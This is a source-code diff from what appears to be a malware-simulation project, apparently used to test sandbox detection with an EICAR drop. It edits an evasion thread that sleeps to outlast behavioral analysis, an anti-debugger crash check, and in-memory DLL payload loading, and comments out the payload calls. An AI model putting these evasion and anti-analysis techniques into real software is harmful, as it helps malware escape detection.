@@ -6,9 +6,10 @@
 
 #include "xLibMaliciousApi.h"
 #include "xOsApi.h"
+#include "xPayload.h"
 
+#include "xPayload.h"
 #include "xPayloadApi.h"
-#include "xPayloadManager.h"
 #include "xUtility.h"
 
 
@@ -33,11 +34,12 @@ static DWORD WINAPI EvasionProc(LPVOID)
 	// Release ownership and cause evil thread to start
 	X_KERNEL32_CALL(LeaveCriticalSection)(&g_sync);
 
-	// Wait for a randomized time which sleeps ~10 min
-	for (uint32_t ui = 0; ui < 1000 || g_doingEvil; ui++)
+	do
 	{
-		X_KERNEL32_CALL(Sleep)((uint16_t) rand());
+		// Explicit sandbox killable sleep
+		Sleep((uint16_t) rand());
 	}
+	while (g_doingEvil);
 
 	// If wait returns the process exits, thus evading behavior analysis of the evil thread 
 	X_KERNEL32_CALL(ExitProcess)(0);
@@ -87,14 +89,14 @@ static DWORD WINAPI EvilProc(LPVOID)
 	X_LIB_MALICIOUS_CALL(xCrashIfDebugger)();
 
 	// Eicar drop
-	xPayloadManagerDrop(X_MALWARE_FILE_NAME);
+	//xPayloadDrop(X_MALWARE_FILE_NAME);
 
 	// Memory dll execution
 	uint8_t* payload = NULL;
 
 	uint32_t payloadSize = 0;
 
-	xPayloadManagerGetPayload(&payload, &payloadSize);
+	//xPayloadGetPayload("key", s_payload, sizeof(s_payload), &payload, &payloadSize);
 
 	X_PAYLOAD_INIT(payload, payloadSize);
 
